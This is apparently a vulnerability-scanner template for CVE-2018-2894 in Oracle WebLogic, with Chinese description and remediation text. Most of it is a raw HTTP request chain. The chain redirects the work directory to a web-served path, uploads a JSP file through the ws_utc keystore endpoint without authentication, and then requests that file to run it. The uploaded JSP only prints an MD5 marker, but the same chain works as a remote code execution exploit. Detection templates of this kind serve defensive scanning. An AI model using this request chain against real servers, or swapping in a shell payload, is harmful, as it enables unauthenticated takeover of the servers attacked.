id: CVE-2018-2894
info:
  name: Oracle WebLogic Server - Remote Code Execution
  author:
  - geeknik
  - pdteam
  tags:
  - cve
  - cve2018
  - oracle
  - weblogic
  - rce
  description: |-
    weblogic ws_utc 任意文件上传漏洞
    Oracle融合中间件（子组件：WLS - Web服务）的Oracle WebLogic Server组件中的漏洞。受影响的受支持版本为12.1.3.0,12.2.1.2和12.2.1.3。易于利用的漏洞允许通过HTTP进行网络访问的未经身份验证的攻击者破坏Oracle WebLogic Server。成功攻击此漏洞可能导致Oracle WebLogic Server被占用。

    在开启了Web Service Test Page功能的情况下，攻击者可以无需授权上传恶意文件，从而控制服务器。
  reference:
  - https://blog.detectify.com/2018/11/14/technical-explanation-of-cve-2018-2894-oracle-weblogic-rce/
  - https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/cve-2018-2894
  - https://nvd.nist.gov/vuln/detail/cve-2018-2894
  - http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
  severity: critical
  classification:
    cve-id:
    - cve-2018-2894
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html

    临时修复方案：
    文件上传：
    1、关闭Web Service Test Page功能
    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
    4、单独设置文件服务器的域名。
    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
    6、修复服务器可能存在的解析漏洞。
    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
    8、隐藏上传文件路径。
    9、升级Web Server。
    10、及时修复Web上传代码。
    11、不能有本地文件包含漏洞。
    12、注意0x00截断攻击（PHP更新到最新版本）。
requests:
- matchers:
  - type: word
    words:
    - 26ec00a3a03f6bfc5226fd121567bb58
  extractors:
  - name: id
    type: regex
    regex:
    - <keyStoreItem><id>([0-9]+)</id><name>{{randstr}}
    group: 1
    internal: true
  raw:
  - |
    POST /ws_utc/resources/setting/options HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80
  - |
    POST /ws_utc/resources/setting/keystore HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g

    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_name"

    {{randstr}}
    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_edit_mode"

    false
    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_password_front"


    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_password"


    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_password_changed"

    false
    ------WebKitFormBoundaryuim0dyiDSPBPu31g
    Content-Disposition: form-data; name="ks_filename"; filename="{{randstr}}.jsp"
    Content-Type: application/octet-stream

    <%@ page import="java.util.*,java.io.*"%>
    <%@ page import="java.security.MessageDigest"%>

    <%
    String cve = "CVE-2018-2894";
    MessageDigest alg = MessageDigest.getInstance("MD5");
    alg.reset();
    alg.update(cve.getBytes());
    byte[] digest = alg.digest();
    StringBuffer hashedpasswd = new StringBuffer();
    String hx;
    for (int i=0;i<digest.length;i++){
      hx =  Integer.toHexString(0xFF & digest[i]);
      //0x03 is equal to 0x3, but we need 0x03 for our md5sum
      if(hx.length() == 1){hx = "0" + hx;}
      hashedpasswd.append(hx);
    }

    out.println(hashedpasswd.toString());
    %>
    ------WebKitFormBoundaryuim0dyiDSPBPu31g--
  - |
    GET /ws_utc/css/config/keystore/{{id}}_{{randstr}}.jsp HTTP/1.1
    Host: {{Hostname}}
